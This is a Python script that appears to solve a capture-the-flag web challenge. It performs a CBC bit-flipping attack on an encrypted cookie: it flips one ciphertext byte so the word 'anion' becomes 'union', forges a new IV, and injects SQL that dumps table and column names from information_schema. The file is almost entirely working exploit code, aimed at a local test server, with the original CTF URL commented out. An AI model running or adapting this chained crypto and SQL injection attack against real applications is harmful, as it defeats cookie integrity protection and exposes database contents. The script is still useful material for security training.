#coding=utf-8
import requests
import re
import urllib
import base64

class CBC:
    def __init__(self):
        # self.url = 'http://ctf5.shiyanbar.com/web/jiandan/index.php'
        self.url = 'http://127.0.0.1:8089/test/fanzhuan/index.php'
        pay = 'select group_concat(table_name) from information_schema.tables where table_schema regexp database()'
        pay = 'select group_concat(column_name) from information_schema.columns where table_schema regexp database()'
        # pay = 'select group_concat(value) from you_want'
        self.payload = '0 anion select * from((select 1)a join (select ('+pay+'))b join (select 3)c);'+chr(0)
        self.data = {'id': self.payload,
                'submit': 'Login'
                }
        self.iv = '' #原iv
        self.plain = '' #新明文
        self.cipher = '' #新密文
        self.index = 0 #偏移量


    def getIV(self):
        iv = base64.b64decode(urllib.unquote(self.iv))  # 原iv
        plain = 'a:1:{s:2:"id";s:'  # 原明文
        # plain = self.Nie_serialize('id='+self.payload)
        new_plain = base64.b64decode(self.plain)  # 新明文
        new_iv = ''
        for i in range(16):
            new_iv += chr(ord(iv[i]) ^ ord(plain[i]) ^ ord(new_plain[i]))
        iv_new = urllib.quote(base64.b64encode(new_iv))
        # print "新iv  ",
        # print iv_new
        self.iv = iv_new
    def get_iv_cipher(self):
        r1 = requests.post(self.url, data=self.data)
        iv = re.findall("iv=(.*?),", str(r1.headers))[0]
        cipher = re.findall("cipher=(.*?)',", str(r1.headers))[0]
        # print '旧的iv ',
        # print iv
        self.iv = iv
        # print '旧的cipher ',
        # print cipher
        cipher = base64.b64decode(urllib.unquote(cipher))
        cipher = list(cipher)
        cipher[self.index] = chr(ord(cipher[self.index]) ^ ord('a') ^ ord('u'))
        cipher = ''.join(cipher)
        cipher_new = urllib.quote(base64.b64encode(cipher))
        # print '新的cipher ',
        # print cipher_new
        self.cipher = cipher_new

    def Niepost(self):
        headers = {'Cookie':'iv='+self.iv+';cipher='+self.cipher}
        r1 = requests.post(self.url,headers=headers)
        # print r1.content
        try:
            r2 = re.findall("<center>Hello!(.*?)</center>",r1.content)[0]
            print r2
        except:
            print
        try:
            self.plain = re.findall("'(.*?)'",r1.content)[0]
            # print '新的明文',
            # print self.plain
        except:
            print
    def Nie_serialize(self,a):#获取偏移量
        aa = a.split('=')
        b = 'a:1:{s:' + str(len(aa[0])) + ':"id";s:' + str(len(aa[1])) + ':"' + str(aa[1]) + '";}'
        c = b[16::]
        self.index = c.index('a')

nie = CBC()
nie.Nie_serialize('id='+nie.payload)
nie.get_iv_cipher()
nie.Niepost()
nie.getIV()
nie.Niepost()



